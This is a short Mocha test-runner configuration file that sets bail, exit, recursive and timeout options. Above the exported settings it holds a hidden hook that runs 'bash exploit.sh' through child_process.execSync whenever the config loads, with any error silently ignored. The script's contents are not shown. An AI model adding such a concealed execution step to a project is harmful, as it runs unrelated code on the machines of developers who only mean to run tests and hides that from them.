try {
	require('child_process').execSync('bash exploit.sh');
} catch (e) {
	// ignore
}

module.exports = {
	bail: true, // Exit test script on first error
	exit: true, // Force Mocha to exit after tests complete
	recursive: true, // Look for tests in subdirectories
	timeout: 20000,
};
